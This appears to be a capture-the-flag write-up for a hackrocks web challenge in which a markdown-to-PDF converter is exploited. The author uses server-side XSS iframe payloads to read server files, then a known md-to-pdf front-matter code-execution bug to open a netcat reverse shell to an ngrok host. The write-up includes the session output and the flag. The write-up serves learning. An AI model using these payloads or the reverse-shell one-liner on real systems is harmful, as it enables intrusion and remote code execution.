# Mythic PDF Forge 

## Description

We as developers love markdown but our non dev friends don't. **Convert Your Markdown to PDF** and send them easily :)

To access the challenge, click on the following link:  <http://challenges.hackrocks.com:33333/>

### Analysis

We are given application that converts markdown to pdf, so let's try using `script` tags to do something.

![mystic-pdf-forge-1](/assets/ctf/hackrocks/mystic-pdf-forge-1.png)

Generated PDF content: 

![mystic-pdf-forge-2](/assets/ctf/hackrocks/mystic-pdf-forge-2.png)

Nice, there's no sanitazation on markdown so we can do whatever.<br>
HackerTricks has useful stuff for us [Server Side XSS Dynamic PDF](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf).

I used discovery payload `<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>` to see what files are there.

![mystic-pdf-forge-3](/assets/ctf/hackrocks/mystic-pdf-forge-3.png)

We dont get information about what files are listed in directory. So let's try guessing. There's a standard to name application file `index.js` or `app.js`.

```html
<script>
    document.write(`
    <iframe 
        src="${window.location.href}/index.js" 
        style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:1;">
    </iframe>
    `) 
</script>
```

0w0

![mystic-pdf-forge-4](/assets/ctf/hackrocks/mystic-pdf-forge-4.png)

We identifed that `md-to-pdf` is being used, and quick google search shows us [RCE vulnerability](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880). Let's not jump straight to exploit, let's first find version of packages. Node stores module versions in `package.json`

```html
<script>
    document.write(`
    <iframe 
        src="${window.location.href}/package.json" 
        style="position:fixed; top:0; left:0; width:100%; height:100%; z-index:1;">
    </iframe>
    `) 
</script>
```

![mystic-pdf-forge-5](/assets/ctf/hackrocks/mystic-pdf-forge-5.png)

We are good to proceed. Let's get shell! 0w0

## Solution

___Simple:___ 

```html
<script>
document.write(`<iframe src="${window.location.href}/flag.txt"></iframe>`)
</script>
```

___Fun!___ (Idk I just wanted to try getting shell from remote machine to local, ~~real life scenario?)

We need 2 things:
1. Listener - simple netcat will do
2. Server - to let challenge server connect to us. netcat opens port locally, we need globally and [ngrok](https://ngrok.com) can do it for us. 

```bash
$ nc -lvnp <port> # Terminal 1

$ ngrok tcp <port> # Terminal 2
```

![mystic-pdf-forge-6](/assets/ctf/hackrocks/mystic-pdf-forge-6.png)

Create reverse shell. I generated it using [revshells](https://www.revshells.com). (I couldnt make `sh` shell work, so I ended up with netcat shell payload)

```html
---js
((require("child_process")).execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ngrok_server> <ngrok_port> >/tmp/f"))
---
```

Server hangs and boom! we get a shell. Pretty cool for first time experience.

```bash
└─$ nc -lvnp 4444 # Local Port Can Be Anything You Want
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48168
sh: cant access tty; job control turned off
/app $ ls
Dockerfile
deploy-dcompose.sh
deploy-docker.sh
docker-compose.yml
flag.txt
index.html
index.js
node_modules
package-lock.json
package.json
pnpm-lock.yaml
public
views
/app $ cat flag.txt
flag{un1esh_t4e_f0rge_666f726765} 
```
::: tip
Flag flag{un1esh_t4e_f0rge_666f726765} 
:::